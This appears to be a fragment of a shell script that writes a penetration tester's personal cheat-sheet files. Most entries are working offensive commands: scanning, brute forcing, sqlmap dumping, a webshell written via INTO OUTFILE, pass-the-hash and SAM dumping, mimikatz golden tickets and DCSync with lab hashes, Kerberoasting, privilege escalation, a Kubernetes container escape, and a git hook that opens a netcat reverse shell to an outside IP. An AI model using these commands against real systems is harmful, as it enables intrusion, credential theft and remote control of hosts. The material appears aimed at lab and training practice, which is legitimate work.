minikube stop
minikube status
minikube dashboard
minikube delete
minikube pause
minikube unpause
minikube ip
minikube addons list
minikube addons enable <addon_name>
minikube addons disable <addon_name>
minikube config set memory 4096
minikube ssh
minikube kubectl -- <kubectl_command>
minikube service <service_name>
minikube service list
minikube profile list
minikube profile <profile_name>
minikube update-check
minikube version
######################################################


REFEOF

    cat > "$REFERENCE_DST/common" << 'REFEOF'
================================================================================
===Nmap====
nmap -p- -sT -sV -A $IP
nmap -p- -sC -sV $IP --open
nmap -p- --script=vuln $IP
###HTTP-Methods
nmap --script http-methods --script-args http-methods.url-path='/website' 
###  --script smb-enum-shares
sed IPs:
grep -oE '((1?[0-9][0-9]?|2[0-4][0-9]|25[0-5])\.){3}(1?[0-9][0-9]?|2[0-4][0-9]|25[0-5])' FILE

================================================================================
===WPScan & SSL
wpscan --url $URL --disable-tls-checks --enumerate p --enumerate t --enumerate u

===WPScan Brute Forceing:
wpscan --url $URL --disable-tls-checks -U users -P /usr/share/wordlists/rockyou.txt

===Aggressive Plugin Detection:
wpscan --url $URL --enumerate p --plugins-detection aggressive
================================================================================
===Nikto with SSL and Evasion
nikto --host $IP -ssl -evasion 1
SEE EVASION MODALITIES.
================================================================================
===dns_recon
dnsrecon –d yourdomain.com
================================================================================
===gobuster directory
gobuster dir -u $URL -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt -k -t 30

===gobuster files
gobuster dir -u $URL -w /opt/SecLists/Discovery/Web-Content/raft-medium-files.txt -k -t 30

===gobuster or ffuf for SubDomain brute forcing:
gobuster dns -d domain.org -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -t 30

ffuf -w /opt/SecLists/Discovery/DNS/namelist.txt -u $URL -H "HOST: FUZZ.somehost.local" -fs 154
"just make sure any DNS name you find resolves to an in-scope address before you test it"
================================================================================
===Extract IPs from a text file.
grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' nmapfile.txt
================================================================================
===Wfuzz XSS Fuzzing============================================================
wfuzz -c -z file,/opt/SecLists/Fuzzing/XSS/XSS-BruteLogic.txt "$URL"
wfuzz -c -z file,/opt/SecLists/Fuzzing/XSS/XSS-Jhaddix.txt "$URL"

===COMMAND INJECTION WITH POST DATA
wfuzz -c -z file,/opt/SecLists/Fuzzing/command-injection-commix.txt -d "doi=FUZZ" "$URL"

===Test for Paramter Existence!
wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/burp-parameter-names.txt "$URL"

===AUTHENTICATED FUZZING DIRECTORIES:
wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt --hc 404 -d "SESSIONID=value" "$URL"

===AUTHENTICATED FILE FUZZING:
wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/raft-medium-files.txt --hc 404 -d "SESSIONID=value" "$URL"

===FUZZ Directories:
wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/raft-large-directories.txt --hc 404 "$URL"

===FUZZ FILES:
wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/raft-large-files.txt --hc 404 "$URL"
|
LARGE WORDS:
wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/raft-small-words.txt --hc 404 "$URL"
|
USERS:
wfuzz -c -z file,/opt/SecLists/Usernames/top-usernames-shortlist.txt --hc 404,403 "$URL"

#FUZZ RECURSIVELY
ffuf -u $URL -w /opt/SecLists/Discovery/Web-Content/raft-medium-words.txt -recursion -recursion-depth 3 -e .php,.asp,.aspx,.jsp,.txt -t 50 -fc 404

================================================================================
===Command Injection with commix, ssl, waf, random agent.
commix --url="https://supermegaleetultradomain.com?parameter=" --level=3 --force-ssl --skip-waf --random-agent
================================================================================
===SQLMap
sqlmap -u $URL --threads=2 --time-sec=10 --level=2 --risk=2 --technique=T --force-ssl
sqlmap -u $URL --threads=2 --time-sec=10 --level=4 --risk=3 --dump
/SecLists/Fuzzing/alphanum-case.txt================================================================================
===Social Recon
theharvester -d domain.org -l 500 -b google
================================================================================
===Nmap HTTP-methods
nmap -p80,443 --script=http-methods  --script-args http-methods.url-path='/directory/goes/here'
================================================================================
===SMTP USER ENUM
smtp-user-enum -M VRFY -U /opt/SecLists/Usernames/xato-net-10-million-usernames.txt -t $IP
smtp-user-enum -M EXPN -U /opt/SecLists/Usernames/xato-net-10-million-usernames.txt -t $IP
smtp-user-enum -M RCPT -U /opt/SecLists/Usernames/xato-net-10-million-usernames.txt -t $IP
smtp-user-enum -M EXPN -U /opt/SecLists/Usernames/xato-net-10-million-usernames.txt -t $IP
================================================================================

===Command Execution Verification - [Ping check]
tcpdump -i any -c5 icmp
====
#Check Network
netdiscover /r 0.0.0.0/24
====
#INTO OUTFILE D00R
SELECT “” into outfile “/var/www/WEROOT/backdoor.php”;
====
LFI?
#PHP Filter Checks.
php://filter/convert.base64-encode/resource=
====
UPLOAD IMAGE?
GIF89a1
====
#SNMP Public Community Strings?
snmpwalk -v2c -c public 192.168.1.100
====
#RPC Null Sessions?
rpcclient -U "" -N <LDAP_SERVER>
====
#SMB Signing Check
netexec smb <internal_scope_file> --gen-relay-list relay-list.txt --no-bruteforce
====
#Extract Links from Source
grep -Eo 'https?://[^"'"'"' >)]+' 
====
REFEOF

    cat > "$REFERENCE_DST/crackmapexecref" << 'REFEOF'
=====CRACKMAPEXEC FUN===========================================================
https://www.ivoidwarranties.tech/posts/pentesting-tuts/cme/crackmapexec-cheatsheet/

crackmapexec 192.168.10.11 -u Administrator -p 'P@ssw0rd' -x whoami

crackmapexec 192.168.215.104 -u 'Administrator' -p 'PASS' -x 'net user Administrator /domain' --exec-method smbexec

crackmapexec 192.168.10.11 -u Administrator -p 'P@ssw0rd' -X '$PSVersionTable'

crackmapexec 192.168.215.104 -u 'Administrator' -p 'PASS' --lusers

Dumping the SAM hashes:
crackmapexec 192.168.215.104 -u 'Administrator' -p 'PASS' --local-auth --sam

Passing-the-Hash against subnet:
crackmapexec smb 172.16.157.0/24 -u administrator -H 'aad3b435b51404eeaa35b51404ee:5509de4fa6e8d9f4a61100e51' --local-auth

crackmapexec smb 172.16.10.0/24 -u USER -p PASSWORD --local-auth -x 'net user Administrator /domain' --exec-method smbexec
================================================================================
HOSTNAME: client251

[Domain Users]
net user /DOMAIN
adam                     Administrator            DefaultAccount
Guest                    iis_service              jeff_admin
krbtgt                   offsec                   sql_service

[DOMAIN TARGET]
JEFF_ADMIN

jeff_admin (primary target)
Enterprise/Domain Admin Target.

[ net group /DOMAIN ]
Group Accounts for \\DC01.corp.com
DC01.corp.com
-------------------------------------------------------------------------------
Nested Groups (Groups with more than one user)?
Another_Nested_Group
Nested_Group
SecretGroup
-------------------------------------------------------------------------------
*Another_Nested_Group
*Cloneable Domain Controllers
*DnsUpdateProxy
*Domain Admins
*Domain Computers
*Domain Controllers
*Domain Guests
*Domain Users
*Enterprise Admins
*Enterprise Key Admins
*Enterprise Read-only Domain Controllers
*Group Policy Creator Owners
*Key Admins
*Nested_Group
*Protected Users
*Read-only Domain Controllers
*Schema Admins
*Secret_Group
The command completed successfully.
================================================================================
powershell:\> [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

================================================================================
LDAP is your friend. It's like an API that allows us to search or query DOMAIN info.
After all, we want to be Domain, don't we?
LDAP://HostName:PORT/DistinguishedName
================================================================================
Pwning smb/shell:
apt-get install -y poetry
poetry install cme (or crackmapexec I can't remember)

#Assuming you have a valid user/password combination:
poetry run crackmapexec smb 10.129.71.31 -u='xadmin' -p='agent_x44'
(should say pwn3d)
* apt-get install -y evil-winrm
evil-winrm -i <target> -u <username> -p <password>
$---BLING BLING---$
REFEOF

    cat > "$REFERENCE_DST/drushref.txt" << 'REFEOF'
#==CVE RELATED==================================================================
drush user-password admin --password=raj
Changed password for admin                                                                                                 [success]
ok.
#==CVE RELATED==================================================================
REFEOF

    cat > "$REFERENCE_DST/gdb-reference" << 'REFEOF'
Cheat Sheet:
https://darkdust.net/files/GDB%20Cheat%20Sheet.pdf

REFEOF

    cat > "$REFERENCE_DST/gitref" << 'REFEOF'
[Pull Some Git Shit]
./gitdumper.sh http://domain.com/.git/ /root/GitRoot/git-tmp/

[Escalation as SUDO git]
sudo git -p help config
\!/bin/sh
#

[INSIDE THE .git PROJECT FOLDER]
mkdir -p hooks/
chmod +777 hooks/
cd hooks/

[File post-commit]
#!/bin/bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.49.60 443 >/tmp/f
[END FILE]

Then:
chmod +x post-commit | chmod 777 post-commit
cd ../
zip -r shell.zip .git/
cp shell.zip /var/www/html

[nc Listener]
nc -lvp 443
REFEOF

    cat > "$REFERENCE_DST/gpgref" << 'REFEOF'
===Copy/Paste for working with gpg I can't be bothered
gpg --batch --passphrase <PASS_OF_GPG> -d <.gpg FILE>
REFEOF

    cat > "$REFERENCE_DST/grepRef.txt" << 'REFEOF'
grep -rl hash *

grep -vE "nologin|false" /etc/passwd"
REFEOF

    cat > "$REFERENCE_DST/jarref" << 'REFEOF'
===========================================================
====psql login
psql -h localhost -d mydatabase -U myuser -p

OR

psql -h localhost -U postgres
<supply password>
===========================================================
\list <list of databases>
\c  [connect]
\dt [display tables]
\q  [quit]
===========================================================
REFEOF

    cat > "$REFERENCE_DST/kerbref" << 'REFEOF'
================================================================================
Entry_1:
  Name: Notes
  Description: Notes for Kerberos
  Note: |
    Firstly, Kerberos is an authentication protocol, not authorization. In other words, it allows to identify each user, who provides a secret password, however, it does not validates to which resources or services can this user access.
    Kerberos is used in Active Directory. In this platform, Kerberos provides information about the privileges of each user, but it is responsability of each service to determine if the user has access to its resources.

    https://book.hacktricks.xyz/pentesting/pentesting-kerberos-88

[ Entry_2 ]
### Pre-Creds
### Brute Force to get Usernames
nmap -p88 --script=krb5-enum-users --script-args krb5-enum-users.realm="heist.offsec0.",userdb={/opt/SecLists/Usernames/xato-net-10-million-usernames.txt} $IP

Entry_3:
  Name: With Usernames
  Description: Brute Force with Usernames and Passwords
  Note: consider git clonehttps://github.com/ropnop/kerbrute.git ./kerbrute -h

Entry_4:
  Name: With Creds
  Description: Attempt to get a list of user service principal names
  Command: GetUserSPNs.py -request -dc-ip {IP} active.htb/svc_tgs
================================================================================
====Linux:
msf> use auxiliary/gather/get_user_spns
GetUserSPNs.py -request -dc-ip 192.168.2.160 <DOMAIN.FULL>/<USERNAME> -outputfile hashes.kerberoast # Password will be prompted
GetUserSPNs.py -request -dc-ip 192.168.2.160 -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USERNAME> -outputfile hashes.kerberoast

Therefore, to perform Kerberoasting, only a domain account that can request for TGSs is necessary, which is anyone since no special privileges are required.
You need valid credentials inside the domain.
================================================================================
[+] kerbrute
kerbrute userenum --dc 10.65.1.21 -d kinetic.corp /usr/share/SecLists-master/Usernames/xato-net-10-million-usernames.txt
================================================================================
#mimikatz
kerberos::golden /User:Administrator /domain:kinetic.corp /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
.\Rubeus.exe ptt /ticket:ticket.kirbi

rubeus.exe asktgt /user:harshitrajpal /password:Password@1

klist #List tickets in memory
kerberos::golden /user:Administrator /domain:kinetic.corp /sid:S-1-5-21-1874506631-3219952063-538504511 /aes256:430b2fdb13cc820d73ecf123dddd4c9d76425d4c2156b89ac551efb9d591a439 /ticket:golden.kirbi

.\Rubeus.exe ptt /ticket:golden.kirbi
.\Rubeux.exe -accepteula \\
============================================================================
Add-Type –AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken –ArgumentList ‘MSSQLSvc/jefflab-sql02.jefflab.local:1433’
============================================================================
Kerberoast into 10.65.20.20'
Get valid AD User (Domain User - Required).
lsadump::dcsync /user:<USERNAME>
lsadump::dcsync /user:freya
GATHER: SID S-1-5-21-3128073206-3686985830-824703377-1108
GATHER: NTLM 3e340d014d26dbfb58b5ceeea8d26cd0
GATHER: aes256_hmac af19161a51a1e6fd7f38afad96a79390efc9439c21fe6ccf1cb78dc2934fdea1

Create it.
kerberos::golden /user:freya /domain:arc.corp /sid:S-1-5-21-3128073206-3686985830-824703377-1105 /aes256:eac6b17ec1ed2528c34e447acc1fe4a607ea15efb7f034608b4eaa8a5a261cd8 /target:DCARC.arc.corp /ticket:zonia_tgt.kirbi

Inject it.
kerberos:ptt freya_tgt.kirbi

klist
C:\Windows\Tasks>klist
klist

Current LogonId is 0:0x47c819

Cached Tickets: (1)

#0>     Client: freya @ zero.arc.corp
        Server: HTTP/DCARC.arc.corp @ zero.arc.corp
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a00000 -> forwardable renewable pre_authent 
        Start Time: 3/29/2023 21:47:36 (local)
        End Time:   3/26/2033 21:47:36 (local)
        Renew Time: 3/26/2033 21:47:36 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0 
        Kdc Called: 


Now that we have all that info - we need to create the .kirbi file properly.
kerberos::golden /user:freya /domain:arc.corp /sid:S-1-5-21-3128073206-3686985830-824703377 /aes256:af19161a51a1e6fd7f38afad96a79390efc9439c21fe6ccf1cb78dc2934fdea1 /target:DCARC.arc.corp /ticket:freya_tgt.kirbi
"Final Ticket Saved to file !"

TRANSFER proper .kirbi file to local machine.
CONVERT proper .kirbi file to a .ccache file
---
INFO:root:Parsing kirbi file /home/kali/engagement/kinetic-range/targets/DCZERO-10.65.20.30/freya_tgt.kirbi
INFO:root:Done!
---

python /usr/lib/python3/dist-packages/minikerberos/examples/kirbi2ccache.py freya_tgt.kirbi freya_tgt.ccache
export KRB5CCNAME=<PATH_TO_.ccache>

#Test SMB Access (with ticket in memory from klist)
\\10.65.20.20\c$
smbclient -k //10.65.20.20/C$

/opt/impacket/examples/psexec.py -k -no-pass arc.corp\freya@10.65.20.20

===============================================================================
#GetUserSPNs.py - Port 88
GetUserSPNS.py -request -dc-ip $IP active.htb/SVC_TGS:GPPstillStandingStrong2k18
* Get Hash.
* Crack Hash.
impacket-psexec Administrator:Ticketmaster1968@10.129.158.133 cmd
===============================================================================

REFEOF

    cat > "$REFERENCE_DST/kuberef" << 'REFEOF'
######################################################
[+] Add "kube" as bash alias for "minikube"...flows nicer.
[+] 
nano ~/.bashrc
(scroll to bottom)
|
v
echo "alias kube='clear ; kubectl \$*'" >> ~/.bashrc
source ~/.bashrc

############################################################################################################################
[INSTALL KUBERNETES]
kubectl (Kubernetes Control)
+-----------------------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| Step                        | Command                                                                                                                                                                     |
+-----------------------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| Update the system           | apt-get update && sudo apt-get upgrade -y                                                                                                                                   |
| Install required packages   | apt-get install -y curl apt-transport-https                                                                                                                                 |
| Download Minikube           | curl -Lo minikube https://storage.googleapis.com/minikube/releases/latest/minikube-linux-amd64                                                                              |
| Make Minikube executable    | chmod +x minikube                                                                                                                                                           |
| Move Minikube to bin        | mv minikube /usr/local/bin/                                                                                                                                                 |
| Install Kubectl             | curl -LO https://storage.googleapis.com/kubernetes-release/release/`curl -s https://storage.googleapis.com/kubernetes-release/release/stable.txt`/bin/linux/amd64/kubectl   |
| Make Kubectl executable     | chmod +x kubectl                                                                                                                                                            |
| Move Kubectl to bin         | mv kubectl /usr/local/bin/                                                                                                                                                  |
| Start Minikube              | minikube start                                                                                                                                                              |
+-----------------------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
############################################################################################################################
[START KUBERNETES]
1. Minikube Commands / Cheat Sheet
minikube start
minikube status
minikube dashboard --url
<Open the URL in your Web Browser>

############################################################################################################################
[DEPLOY AN APPLICATION]
cd $HOME

--> https://github.com/madhuakula/kubernetes-goat

git clone https://github.com/madhuakula/kubernetes-goat.git
cd kubernetes-goat
chmod +x setup-kubernetes-goat.sh
bash setup-kubernetes-goat.sh

[+] Ensure the pods are running before running the access script
kubectl get pods
NAME                                               READY   STATUS              RESTARTS       AGE
batch-check-job-gxdfh                              0/1     ContainerCreating   0              7s
build-code-deployment-6ff7b98f7c-cpwhn             0/1     ContainerCreating   0              7s
health-check-deployment-65d6ff7776-6khsw           0/1     ContainerCreating   0              7s
hidden-in-layers-ks28s                             0/1     ContainerCreating   0              5s
internal-proxy-deployment-646b4cfcd7-n8p4j         0/2     ContainerCreating   0              6s
kubernetes-goat-home-deployment-7f8486f6c7-x8g5l   0/1     ContainerCreating   0              6s
nginx-7854ff8877-xq7ls                             1/1     Running             1 (108s ago)   20m
poor-registry-deployment-877b55d89-c4rlg           0/1     ContainerCreating   0              6s
system-monitor-deployment-5466d8b787-56g68         0/1     ContainerCreating   0              5s

[+] KUBERNETES GOAT.
$ pwd
/home/kali/kubernetes/kubernetes-goat
[+] AS A LOW-PRIVILEGED USER
|
v
[+] chmod 755 *-goat.sh
[+] ./setup-kubernetes-goat.sh
[+] kubectl get pods
[+] Pods good?
[+] kubectl get pods
----------------------------------------------------------------------------------------+
NAME                                               READY   STATUS    RESTARTS      AGE
batch-check-job-gxdfh                              1/1     Running   0             52m
build-code-deployment-6ff7b98f7c-cpwhn             1/1     Running   0             52m
health-check-deployment-65d6ff7776-6khsw           1/1     Running   0             52m
hidden-in-layers-ks28s                             1/1     Running   0             52m
internal-proxy-deployment-646b4cfcd7-n8p4j         2/2     Running   0             52m
kubernetes-goat-home-deployment-7f8486f6c7-x8g5l   1/1     Running   0             52m
nginx-7854ff8877-xq7ls                             1/1     Running   1 (54m ago)   72m
poor-registry-deployment-877b55d89-c4rlg           1/1     Running   0             52m
system-monitor-deployment-5466d8b787-56g68         1/1     Running   0             52m
----------------------------------------------------------------------------------------+

[+] ./access-kubernetes-goat.sh
Creating port forward for all the Kubernetes Goat resources to locally. We will be using 1230 to 1236 ports locally!
Visit http://127.0.0.1:1234 to get started with your Kubernetes Goat hacking!

[+] Load Browser --> http://127.0.0.1:1234

############################################################################################################################

# "Can I list the pods?"
kubectl get pods

############################################################################################################################
# Useful Commands.
+----------------------------------------------------------+---------------------------------------------------------------+
| Description                                              | Command                                                       |
+----------------------------------------------------------+---------------------------------------------------------------+
| List all pods in the current namespace                   | kubectl get pods                                              |
| List all services in the current namespace               | kubectl get svc                                               |
| List all deployments in the current namespace            | kubectl get deployments                                       |
| Create a resource from a YAML or JSON file               | kubectl create -f <file.yaml>                                 |
| Apply changes to a resource from a YAML or JSON file     | kubectl apply -f <file.yaml>                                  |
| Delete a specific pod by name                            | kubectl delete pod <pod-name>                                 |
| Execute an interactive bash shell in the specified pod   | kubectl exec -it <pod-name> -- /bin/bash                      |
| Fetch and tail the logs of a specific pod                | kubectl logs <pod-name>                                       |
| Show detailed information about a specific pod           | kubectl describe pod <pod-name>                               |
| Scale a deployment to a specified number of replicas     | kubectl scale deployment <deployment-name> --replicas=<num>   |
| Get the rollout status of a deployment                   | kubectl rollout status deployment/<deployment-name>           |
| Roll back to the previous deployment                     | kubectl rollout undo deployment/<deployment-name>             |
| Forward one or more local ports to a pod                 | kubectl port-forward pod/<pod-name> <local-port>:<pod-port>   |
| Display resource (CPU/memory) usage of pods              | kubectl top pod                                               |
| View Kubernetes configuration files                      | kubectl config view                                           |
+----------------------------------------------------------+---------------------------------------------------------------+

############################################################################################################################
[kubectl]
# With the "kube" alias, it's better like this.
echo "alias kube='clear ; kubectl $*'" >> ~/.bashrc
source ~/.bashrc

+----------------------------------------------------------+---------------------------------------------------------------+
| Description                                              | Command                                                       |
+----------------------------------------------------------+---------------------------------------------------------------+
| List all pods in the current namespace                   | kube get pods                                                 |
| List all services in the current namespace               | kube get svc                                                  |
| List all deployments in the current namespace            | kube get deployments                                          |
| Create a resource from a YAML or JSON file               | kube create -f <file.yaml>                                    |
| Apply changes to a resource from a YAML or JSON file     | kube apply -f <file.yaml>                                     |
| Delete a specific pod by name                            | kube delete pod <pod-name>                                    |
| Execute an interactive bash shell in the specified pod   | kube exec -it <pod-name> -- /bin/bash                         |
| Fetch and tail the logs of a specific pod                | kube logs <pod-name>                                          |
| Show detailed information about a specific pod           | kube describe pod <pod-name>                                  |
| Scale a deployment to a specified number of replicas     | kube scale deployment <deployment-name> --replicas=<num>      |
| Get the rollout status of a deployment                   | kube rollout status deployment/<deployment-name>              |
| Roll back to the previous deployment                     | kube rollout undo deployment/<deployment-name>                |
| Forward one or more local ports to a pod                 | kube port-forward pod/<pod-name> <local-port>:<pod-port>      |
| Display resource (CPU/memory) usage of pods              | kube top pod                                                  |
| View Kubernetes configuration files                      | kube config view                                              |
+----------------------------------------------------------+---------------------------------------------------------------+
############################################################################################################################
minikube start
minikube delete
minikube pause
minikube unpause
minikube ip
minikube addons list
minikube addons enable <addon_name>
minikube addons disable <addon_name>
minikube config set memory 4096
minikube ssh
minikube kubectl -- <kubectl_command>
minikube service <service_name>
minikube service list
minikube profile list
minikube profile <profile_name>
minikube update-check
minikube version
minikube stop
############################################################################################################################
[KUBERNETES RUNNING?]
- GET THE IP
minikube ip
192.168.59.100

$ nmap -p- -sV 192.168.59.100 --open
PORT      STATE SERVICE          VERSION
22/tcp    open  ssh              OpenSSH 8.8 (protocol 2.0)
111/tcp   open  rpcbind          2-4 (RPC #100000)
2049/tcp  open  nfs              3-4 (RPC #100003)
2376/tcp  open  ssl/docker?
2379/tcp  open  ssl/etcd-client?
2380/tcp  open  ssl/etcd-server?
5355/tcp  open  llmnr?
8443/tcp  open  ssl/https-alt
10249/tcp open  http             Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
10250/tcp open  ssl/http         Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
10256/tcp open  http             Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
30003/tcp open  amicon-fpsu-ra?
32484/tcp open  http             nginx 1.25.4
34557/tcp open  nlockmgr         1-4 (RPC #100021)
35317/tcp open  mountd           1-3 (RPC #100005)
35433/tcp open  unknown
43193/tcp open  status           1 (RPC #100024)
47837/tcp open  mountd           1-3 (RPC #100005)
58597/tcp open  mountd           1-3 (RPC #100005)
############################################################################################################################
[minikube ALIAS]
[+] Put this entire flat file into $HOME/reference/kuberef
[+] Add kube to your .bashrc for easy and smooth kubectl access.
echo "alias kube='clear ; kubectl \$*'" >> ~/.bashrc
source ~/.bashrc
############################################################################################################################
[VirtualBox - Alias]
echo "alias kube='clear ; VBoxManage \$*'" >> ~/.bashrc
source ~/.bashrc

+-----Useful Commands-----+
+-------------------------------------+------------------------------------------------+
| Command                             | Description                                    |
+-------------------------------------+------------------------------------------------+
| list vms                            | List all VirtualBox VMs                        |
| startvm <vmname>                    | Start a specified VM                           |
| controlvm <vmname> poweroff         | Power off a specified VM                       |
| snapshot <vmname> take <snapshotname>| Take a snapshot of a specified VM             |
| snapshot <vmname> restore <snapshotname>| Restore a specified VM to a snapshot       |
| modifyvm <vmname> --memory <size>   | Change the memory size of a specified VM       |
| modifyvm <vmname> --cpus <count>    | Change the number of CPUs of a specified VM    |
| clonevm <vmname> --name <clonevmname> --register | Clone a VM                        |
| unregistervm <vmname> --delete      | Unregister and delete a VM                     |
+-------------------------------------+------------------------------------------------+
e.x. vbox list vms
e.x. vbox control vm
############################################################################################################################
Now just type kuberef in a new terminal.
;)
-S1REN

############################################################################################################################
[KERBEROS CLOUD HACKING]
[+] https://madhuakula.com/kubernetes-goat/docs
############################################################################################################################
# KUBERNETES - SENSITIVE INFORMATION IN CODE AND COMMITS.
[+] Let’s see if we can find something useful!
[+] Scenario URL: http://127.0.0.1:1230/
[+] Load in Burp Suite's built-in web browser.
############################################################################################################################
# KUBERNETES - breakout
https://madhuakula.com/kubernetes-goat/docs/scenarios/scenario-4/container-escape-to-the-host-system-in-kubernetes-containers/welcome
# Breakout
==========================
chroot /host-system bash
==========================
root@system-monitor-deployment-5466d8b787-56g68:/# hostname
system-monitor-deployment-5466d8b787-56g68

root@system-monitor-deployment-5466d8b787-56g68:/# id
uid=0(root) gid=0(root) groups=0(root)

root@system-monitor-deployment-5466d8b787-56g68:/# chroot /host-system bash
bash-5.0# hostname
system-monitor-deployment-5466d8b787-56g68

bash-5.0# id
uid=0(root) gid=0(root) groups=0(root)
############################################################################################################################
REFEOF

    cat > "$REFERENCE_DST/ldapref" << 'REFEOF'
====================================================================
Creds from netexec working?
#Enumerate Domain Information
ldapsearch -x -H ldap://10.65.20.30 -D "clover@zero.arc.corp" -w starlight -b "DC=zero,DC=arc,DC=corp"

#Enumerate User Information
ldapsearch -x -H ldap://10.65.20.30 -D "clover@zero.arc.corp" -w starlight -b "DC=zero,DC=arc,DC=corp" "(objectClass=user)"

#Extract Group Memberships
ldapsearch -x -H ldap://10.65.20.30 -D "clover@zero.arc.corp" -w starlight -b "DC=zero,DC=arc,DC=corp" "(objectClass=group)"

#Query a Specific User
ldapsearch -x -H ldap://10.65.20.30 -D "clover@zero.arc.corp" -w starlight -b "DC=zero,DC=arc,DC=corp" "(sAMAccountName=zonia)"

Where 10.65.20.30 = the machine that had success with creds from nxc.
====================================================================

REFEOF

    cat > "$REFERENCE_DST/lfiBase64Reference.txt" << 'REFEOF'
================================================================================
http://ip/index,php?id=
REFEOF

    cat > "$REFERENCE_DST/lfiref" << 'REFEOF'
php://filter
' and die(system("/tmp/shell.elf")) or '
REFEOF

    cat > "$REFERENCE_DST/linuxPostExploitation.txt" << 'REFEOF'
//Where can I live out of?
quick look at /var/lib
quick look at /var/db
Anything interesting?

find / -perm -2 ! -type l -ls 2>/dev/null
<DID YOU FIND A USER? LOCATE FILES ON THE SYSTEM CONTAINING THEIR USERNAME>

env <--------This is a thing.
sudo -l <----Also a thing.
================================================================================
==nmap escalation through an NSE Script.
echo "os.execute('/bin/sh')">/tmp/root.nse
sudo nmap --script=/tmp/root.nse
================================================================================
=====SUID BINARIES - nmap, vim, find, bash, more, less, nano, cp
https://pentestlab.blog/2017/09/25/suid-executables/
https://github.com/xapax/security/blob/master/privilege_escalation_-_linux.md
#Find SUID
find / -perm -u=s -type f 2>/dev/null

#Find GUID
find / -perm -g=s -type f 2>/dev/null

#Find by Group
sudo find / -group <GROUP_NAME> 2>/dev/null

#File Capabilties (extended priviledge -ep?)
getcap -r / 2>/dev/null
python -c 'import os; os.setuid(0); os.system("/bin/bash")'
================================================================================
#Looks in common places for SUID SGID files in BIN: Very Nice.==================
for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done
[Check for pkexec or other Interestings]

====Is ASLR Enabled?============================================================
cat /proc/sys/kernel/randomize_va_space
(If it returns 2, then yes, if nothing...well ;> )
================================================================================

====IS THERE A USER? FRSKIGOD?==================================================
ls -lsa /home/
====YES?
find / -iname * 'USERNAME' 2>/dev/null
================================================================================
Adding a binary to PATH, to hijack another SUID binary invokes it without the fully qualified path.

$ function /usr/bin/foo () { /usr/bin/echo "It works"; }
$ export -f /usr/bin/foo
$ /usr/bin/foo
    It works
================================================================================

//Get Valid Users.
grep -vE "nologin|false" /etc/passwd

// Show me all the last files modified or recently changes..
find . -type f -not -path '*/\.*' -printf '%TY.%Tm.%Td %THh%TM %Ta %p\n' |sort -nr |head -n 10 2>/dev/null

// What binaries do I need to compile to? LSB? PSI? 32?
file /bin/bash

// Mount Informaion
cat /etc/fstab
cat /etc/mtab

================================================================================
// Chkconfig
chkconfig --list | grep 3:on 2>/dev/null

//CPU INFO
cat /proc/cpuinfo
lscpu

*Is Python here, can I break out of this shell?*
find / -iname *'python'* 2>/dev/null

[ BREAK OUT WITH PYTHON ]
python -c 'import pty; pty.spawn("/bin/sh")'
python -c 'import pty; pty.spawn("/bin/bash")'

find / -readable -type f 2>/dev/null
find / -readable -type f -maxdepth 1 2>/dev/null

//Find Readable Shell Files
find / -readable -type f -iname *'.sh'* 2>/dev/null

//Is 95-udev-late.rules on the file system???
find / -iname *'95-udev-late.rules'* 2>/dev/null

//Find files by string
grep -rnw '/etc/' -e 'pattern' 2>/dev/null
===================================================================
//[Note To Self] sh == custom content == writable == double win
grep -rnw '/etc/' -e '.sh' 2>/dev/null
grep -rnw '/dev/' -e '.sh' 2>/dev/null
grep -rnw '/var/' -e '.sh' 2>/dev/null
find / -iname "*.sh" 2>/dev/null
===================================================================
====[CRON]
===================================================================
crontab –u root –l

Look for unusual system-wide cron jobs:
cat /etc/crontab
ls /etc/cron.*
==================================================================
#The fuck can I even read?
ls -aRl /etc/ | awk '$1 ~ /^.*w.*/' 2>/dev/null     # Anyone
ls -aRl /etc/ | awk '$1 ~ /^..w/' 2>/dev/null       # Owner
ls -aRl /etc/ | awk '$1 ~ /^.....w/' 2>/dev/null    # Group
ls -aRl /etc/ | awk '$1 ~ /w.$/' 2>/dev/null        # Other

find /etc/ -readable -type f 2>/dev/null               # Anyone
find /etc/ -readable -type f -maxdepth 1 2>/dev/null   # Anyone
================================================================================
[+ Forwarding out Traffic with mknod]
================================================================================
mknod backpipe p ; nc -l -p 8080 < backpipe | nc 10.5.5.151 80 >backpipe    # Port Relay
mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 80 | tee -a outflow 1>backpipe    # Proxy (Port 80 to 8080)
mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 80 | tee -a outflow & 1>backpipe    # Proxy monitor (Port 80 to 8080)

ls -aRl /etc/ | awk '$1 ~ /^.*w.*/' 2>/dev/null     # Anyone
ls -aRl /etc/ | awk '$1 ~ /^..w/' 2>/dev/null       # Owner
ls -aRl /etc/ | awk '$1 ~ /^.....w/' 2>/dev/null    # Group
